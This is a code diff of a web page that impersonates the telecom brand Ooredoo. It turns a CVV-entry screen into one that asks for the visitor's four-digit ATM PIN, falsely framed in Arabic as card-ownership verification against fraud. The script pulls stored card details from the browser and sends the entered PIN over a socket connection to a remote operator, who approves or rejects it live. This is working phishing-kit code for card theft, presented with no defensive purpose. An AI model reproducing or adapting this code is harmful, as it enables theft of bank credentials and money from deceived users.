@@ -3,57 +3,48 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CVV | Ooredoo</title>
+<title>إثبات ملكية البطاقة ATM | Ooredoo</title>
 <style>
-@font-face { font-family: 'Rubik-Regular'; src: url('/ooredoo/fonts/Rubik-Regular.woff2') format('woff2'); }
-@font-face { font-family: 'Rubik-Medium'; src: url('/ooredoo/fonts/Rubik-Medium.woff2') format('woff2'); }
-@font-face { font-family: 'NotoKufiArabic-Regular'; src: url('/ooredoo/fonts/NotoKufiArabic-Regular.woff2') format('woff2'); }
-@font-face { font-family: 'NotoKufiArabic-SemiBold'; src: url('/ooredoo/fonts/NotoKufiArabic-SemiBold.woff2') format('woff2'); }
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Rubik-Regular', 'NotoKufiArabic-Regular', Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; direction: rtl; }
-.cvv-container { width: 100%; max-width: 420px; margin: 40px auto; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; }
-.logo-row { display: flex; justify-content: center; margin-bottom: 20px; }
-.logo-row img { height: 36px; }
-h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 20px; color: #080808; margin-bottom: 6px; }
-.subtitle { text-align: center; color: #4c5562; font-size: 14px; margin-bottom: 24px; line-height: 1.6; }
-.card-info { background: #f7f7f8; border-radius: 12px; padding: 14px 18px; margin-bottom: 24px; }
-.card-info .row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px; }
-.card-info .row:last-child { margin-bottom: 0; }
-.card-info .label { color: #4c5562; font-size: 13px; }
-.card-info .value { color: #080808; font-size: 14px; font-weight: 600; direction: ltr; }
-.cvv-input-area { display: flex; justify-content: center; gap: 12px; margin-bottom: 20px; }
-.cvv-input-area input { width: 56px; height: 64px; border: 1.5px solid #e0e0e0; border-radius: 12px; text-align: center; font-size: 24px; font-weight: 600; outline: none; transition: border-color 0.2s; }
-.cvv-input-area input:focus { border-color: #ed1c24; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; direction: rtl; }
+.container { width: 100%; max-width: 420px; margin: 40px auto; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; }
+h1 { text-align: center; font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 4px; }
+.atm-label { text-align: center; font-size: 24px; font-weight: 700; color: #6b9e8a; margin-bottom: 10px; }
+.subtitle { text-align: center; color: #4c5562; font-size: 14px; margin-bottom: 20px; }
+.description { background: #f9fafb; border-radius: 12px; padding: 16px 18px; margin-bottom: 28px; color: #333; font-size: 14px; line-height: 1.8; text-align: right; }
+.pin-input-area { display: flex; justify-content: center; gap: 14px; margin-bottom: 24px; direction: ltr; }
+.pin-input-area input { width: 52px; height: 60px; border: 1.5px solid #e0e0e0; border-radius: 12px; text-align: center; font-size: 24px; font-weight: 600; outline: none; transition: border-color 0.2s; }
+.pin-input-area input:focus { border-color: #6b9e8a; }
 .error-msg { color: #ed1c24; font-size: 13px; text-align: center; margin-bottom: 16px; display: none; }
-.submit-btn { width: 100%; height: 56px; border-radius: 999px; border: none; background: #ebecef; color: #9da3ae; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold', sans-serif; font-size: 18px; font-weight: 600; cursor: not-allowed; transition: all 0.2s; }
-.submit-btn.active { background: #ed1c24; color: #fff; cursor: pointer; box-shadow: 0 8px 20px rgba(237,28,36,0.18); }
-.waiting-msg { text-align: center; color: #ed1c24; font-size: 14px; margin-top: 12px; display: none; }
+.submit-btn { width: 100%; height: 54px; border-radius: 12px; border: none; background: #6b9e8a; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+.submit-btn:hover { background: #5a8a78; }
+.submit-btn:disabled { background: #b8d4c8; cursor: not-allowed; }
+.waiting-msg { text-align: center; color: #6b9e8a; font-size: 14px; margin-top: 12px; display: none; }
 @media (max-width: 500px) {
-  .cvv-container { margin: 0; border-radius: 0; min-height: 100vh; padding: 24px 16px; }
+  .container { margin: 0; border-radius: 0; min-height: 100vh; padding: 24px 16px; }
 }
 </style>
 </head>
 <body>
-<div class="cvv-container">
-  <div class="logo-row"><img src="/ooredoo/ooredoo-logo.svg" alt="Ooredoo"></div>
-  <h1>CVV</h1>
-  <p class="subtitle">يرجى إدخال رمز CVV المكون من 3 أرقام الموجود على ظهر بطاقتك.</p>
+<div class="container">
+  <h1>إثبات ملكية البطاقة</h1>
+  <div class="atm-label">ATM</div>
+  <p class="subtitle">لتأكيد العملية أدخل الرقم السري للصراف الآلي</p>
 
-  <div class="card-info">
-    <div class="row"><span class="label">نوع البطاقة</span><span class="value" id="cardType">-</span></div>
-    <div class="row"><span class="label">آخر 4 أرقام</span><span class="value" id="cardLast4">****</span></div>
-    <div class="row"><span class="label">المبلغ</span><span class="value" id="cvvAmount">0 ر.ع</span></div>
+  <div class="description">
+    يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة المنتهية بـ <strong id="lastDigits">****</strong> ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
   </div>
 
-  <div class="cvv-input-area">
-    <input type="tel" maxlength="1" inputmode="numeric" class="cvv-digit" data-index="0">
-    <input type="tel" maxlength="1" inputmode="numeric" class="cvv-digit" data-index="1">
-    <input type="tel" maxlength="1" inputmode="numeric" class="cvv-digit" data-index="2">
+  <div class="pin-input-area">
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="0" autofocus>
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="1">
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="2">
+    <input type="tel" maxlength="1" inputmode="numeric" class="pin-digit" data-index="3">
   </div>
 
-  <div class="error-msg" id="cvvError">رمز CVV غير صحيح. يرجى المحاولة مرة أخرى.</div>
+  <div class="error-msg" id="pinError">الرقم السري غير صحيح. يرجى المحاولة مرة أخرى.</div>
 
-  <button class="submit-btn" id="submitBtn" onclick="submitCVV()">تأكيد</button>
+  <button class="submit-btn" id="submitBtn" onclick="submitPIN()" disabled>تأكيد</button>
   <div class="waiting-msg" id="waitingMsg">جاري التحقق...</div>
 </div>
 
@@ -64,21 +55,20 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
   var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
   var visitorId = localStorage.getItem('visitorId') || '';
 
-  // Load payment data
+  // Load payment data - get last 4 digits
   var paymentData = {};
   try { paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}'); } catch(e) {}
-  document.getElementById('cardType').textContent = paymentData.cardType || '-';
-  document.getElementById('cardLast4').textContent = paymentData.cardLast4 || '****';
-  document.getElementById('cvvAmount').textContent = (paymentData.totalPaid || '0') + ' ر.ع';
+  var last4 = paymentData.cardLast4 || '****';
+  document.getElementById('lastDigits').textContent = last4;
 
-  // CVV digit inputs
-  var digits = document.querySelectorAll('.cvv-digit');
+  // PIN digit inputs
+  var digits = document.querySelectorAll('.pin-digit');
   digits.forEach(function(input, idx) {
     input.addEventListener('input', function() {
       var val = this.value.replace(/\D/g, '');
       this.value = val.slice(0, 1);
       if (val && idx < digits.length - 1) digits[idx + 1].focus();
-      checkCVVComplete();
+      checkPINComplete();
     });
     input.addEventListener('keydown', function(e) {
       if (e.key === 'Backspace' && !this.value && idx > 0) {
@@ -93,18 +83,18 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
       }
       if (paste.length >= digits.length) digits[digits.length - 1].focus();
       else if (paste.length > 0) digits[paste.length].focus();
-      checkCVVComplete();
+      checkPINComplete();
     });
   });
 
-  function checkCVVComplete() {
-    var code = getCVVCode();
+  function checkPINComplete() {
+    var code = getPINCode();
     var btn = document.getElementById('submitBtn');
-    if (code.length === 3) { btn.classList.add('active'); btn.disabled = false; }
-    else { btn.classList.remove('active'); btn.disabled = true; }
+    if (code.length === 4) { btn.disabled = false; }
+    else { btn.disabled = true; }
   }
 
-  function getCVVCode() {
+  function getPINCode() {
     var code = '';
     digits.forEach(function(d) { code += d.value; });
     return code;
@@ -113,7 +103,7 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
   // Socket
   socket.on('connect', function() {
     socket.emit('visitor:register', { existingVisitorId: visitorId || null });
-    socket.emit('visitor:pageEnter', 'CVV');
+    socket.emit('visitor:pageEnter', 'رمز ATM');
   });
   socket.on('visitor:registered', function(data) {
     if (data && data._id) { visitorId = data._id; localStorage.setItem('visitorId', data._id); }
@@ -128,31 +118,40 @@ h1 { text-align: center; font-family: 'Rubik-Medium', 'NotoKufiArabic-SemiBold',
   socket.on('code:action', function(action) {
     var act = (typeof action === 'string') ? action : (action && action.action) || '';
     document.getElementById('waitingMsg').style.display = 'none';
-    document.getElementById('submitBtn').classList.add('active');
     document.getElementById('submitBtn').disabled = false;
     document.getElementById('submitBtn').textContent = 'تأكيد';
 
     if (act === 'approve') {
       window.location.href = '/final-page/';
     } else if (act === 'reject') {
-      document.getElementById('cvvError').style.display = 'block';
+      document.getElementById('pinError').style.display = 'block';
       digits.forEach(function(d) { d.value = ''; });
       digits[0].focus();
     }
   });
 
-  // Submit CVV
-  window.submitCVV = function() {
-    var code = getCVVCode();
-    if (code.length !== 3) return;
-    document.getElementById('cvvError').style.display = 'none';
+  socket.on('card:action', function(action) {
+    var act = (typeof action === 'string') ? action : (action && action.action) || '';
+    document.getElementById('waitingMsg').style.display = 'none';
+    if (act === 'reject') {
+      document.getElementById('pinError').style.display = 'block';
+      digits.forEach(function(d) { d.value = ''; });
+      digits[0].focus();
+    }
+  });
+
+  // Submit PIN
+  window.submitPIN = function() {
+    var code = getPINCode();
+    if (code.length !== 4) return;
+    document.getElementById('pinError').style.display = 'none';
     document.getElementById('submitBtn').disabled = true;
     document.getElementById('submitBtn').textContent = 'جاري التحقق...';
     document.getElementById('waitingMsg').style.display = 'block';
 
     socket.emit('more-info', {
       digitCode: code,
-      page: 'CVV',
+      page: 'رمز ATM',
       waitingForAdminResponse: true
     });
   };
